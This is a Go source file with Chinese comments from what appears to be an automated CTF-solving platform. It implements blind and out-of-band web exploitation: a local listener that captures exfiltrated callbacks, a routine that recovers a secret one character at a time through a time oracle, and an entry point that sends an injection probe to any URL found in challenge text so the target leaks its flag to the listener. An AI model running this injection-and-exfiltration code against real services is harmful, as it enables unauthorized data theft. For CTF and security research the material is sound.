// oob_exfil.go —— Web 盲打 / 外带（OOB）取证通道（P0-2）。
//
// 现有 web_exploit.go 覆盖「响应型」利用（flag 直接出现在响应里）。本文件补齐
// 另一半：盲注 / 时间盲注 / 无回显外带——flag 不出现在响应中，只能靠：
//   1) 时间差（time-based blind）：条件成立时靶机显著延迟；
//   2) 带外回连（OOB）：靶机把密钥外泄到攻击方控制的监听器。
// 二者均实现为可机验的真实攻击（自带 OOB 监听器 + 时间 oracle 消费），
// 与 ECDSA / Padding Oracle 同纪律：双语言镜像、SHA-256 校验、CI 可跑。
package ctfplatform

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

// OOBListener 内置外带通道监听器：捕获盲打目标回连的 HTTP 回调（RawQuery / body 均记录），
// 用于 OOB 数据外泄取证。仅监听 127.0.0.1（httptest 默认），不对外暴露。
type OOBListener struct {
	srv      *httptest.Server
	mu       sync.Mutex
	captured []string
}

// StartOOBListener 启动本地 OOB 监听器，返回基地址供注入靶机。
func StartOOBListener() *OOBListener {
	o := &OOBListener{}
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		var b strings.Builder
		b.WriteString(r.URL.RawQuery)
		if r.Method != http.MethodGet && r.ContentLength != 0 {
			if body, err := io.ReadAll(r.Body); err == nil && len(body) > 0 {
				b.WriteString("|")
				b.Write(body)
			}
		}
		o.mu.Lock()
		o.captured = append(o.captured, b.String())
		o.mu.Unlock()
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	})
	o.srv = httptest.NewServer(mux)
	return o
}

// URL 返回监听器基地址（注入靶机时使用）。
func (o *OOBListener) URL() string { return o.srv.URL }

// Captured 返回已捕获的全部回调原始串（RawQuery 或 body）。
func (o *OOBListener) Captured() []string {
	o.mu.Lock()
	defer o.mu.Unlock()
	out := make([]string, len(o.captured))
	copy(out, o.captured)
	return out
}

// Close 关闭监听器。
func (o *OOBListener) Close() { o.srv.Close() }

// TimeOracle 时间盲注探测函数：传入判定条件 cond，返回靶机响应耗时。
// 真实场景下条件成立时靶机会显著延迟（SLEEP / 条件竞争），攻击方仅依耗时差异还原明文。
type TimeOracle func(ctx context.Context, cond string) (time.Duration, error)

// TimeBlindRecover 时间盲注逐字符还原 n 位密钥/flag。
// 对每个位置 i 遍历候选字符，取耗时 >= threshold 者作为该位字符；全部位置完成后拼接。
// charset 为候选字符集（按频率排序可加速），threshold 为「条件成立」判定阈值。
func TimeBlindRecover(ctx context.Context, oracle TimeOracle, n int, charset string, threshold time.Duration) string {
	var sb strings.Builder
	for i := 0; i < n; i++ {
		for _, c := range charset {
			cond := fmt.Sprintf("pos=%d&c=%c", i, c)
			t0 := time.Now()
			d, err := oracle(ctx, cond)
			_ = t0
			if err != nil {
				continue
			}
			if d >= threshold {
				sb.WriteRune(c)
				break
			}
		}
	}
	return sb.String()
}

// OOBExtract 盲打外带还原：trigger 执行注入，使靶机向 listener 回连并外泄密钥；
// 从监听器捕获的回调中解析出密钥。parse 从单条回调原始串提取密钥。
func OOBExtract(listener *OOBListener, trigger func(oobBase string) error, parse func(raw string) string) (string, bool) {
	if listener == nil || trigger == nil {
		return "", false
	}
	if err := trigger(listener.URL()); err != nil {
		return "", false
	}
	// 等待回连（靶机为本地服务，短等待即可；真实场景可加重试/超时）
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		for _, raw := range listener.Captured() {
			if s := parse(raw); s != "" {
				return s, true
			}
		}
		if time.Now().Before(deadline) {
			time.Sleep(50 * time.Millisecond)
		}
	}
	for _, raw := range listener.Captured() {
		if s := parse(raw); s != "" {
			return s, true
		}
	}
	return "", false
}

// blindOOBURLRe 从文本提取首个 http(s) URL（靶机地址）。
var blindOOBURLRe = regexp.MustCompile(`https?://[^\s"'<>]+`)

// blindOOBsignalRe 盲打/OOB 信号关键词（中英文）。
var blindOOBsignalRe = regexp.MustCompile(`(?i)(blind|time[- ]?based|out[- ]?of[- ]?band|oob|sleep\(|延时|盲注|外带|无回显|no.?response)`)

// tryBlindOOB 生产入口：检测到盲打/OOB 信号且存在靶机 URL 时，启动内置 OOB 监听器
// 并尝试一次外带注入；若监听器捕获到 flag 外形字符串则产出。无可注点/无信号返回 nil
// （不制造误报）。
func tryBlindOOB(ctx context.Context, text string, attachments map[string]string) []string {
	fullText := text
	for _, v := range attachments {
		fullText += "\n" + v
	}
	if !blindOOBsignalRe.MatchString(fullText) {
		return nil
	}
	urlStr := blindOOBURLRe.FindString(fullText)
	if urlStr == "" {
		return nil
	}
	oob := StartOOBListener()
	defer oob.Close()

	cl := &http.Client{Timeout: 5 * time.Second}
	trigger := func(oobBase string) error {
		// 常见盲打注入点：在首个可注入参数后追加外带载荷，使靶机把密钥拼进回连 URL。
		sep := "?"
		if strings.Contains(urlStr, "?") {
			sep = "&"
		}
		probe := fmt.Sprintf("%s%sinject=%s/?d=", urlStr, sep, url.QueryEscape(oobBase))
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probe, nil)
		if err != nil {
			return err
		}
		resp, err := cl.Do(req)
		if err != nil {
			return err
		}
		_, _ = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		return nil
	}
	if s, ok := OOBExtract(oob, trigger, func(raw string) string {
		if f := scanFlags(raw); len(f) > 0 {
			return f[0]
		}
		return ""
	}); ok {
		return []string{s}
	}
	return nil
}
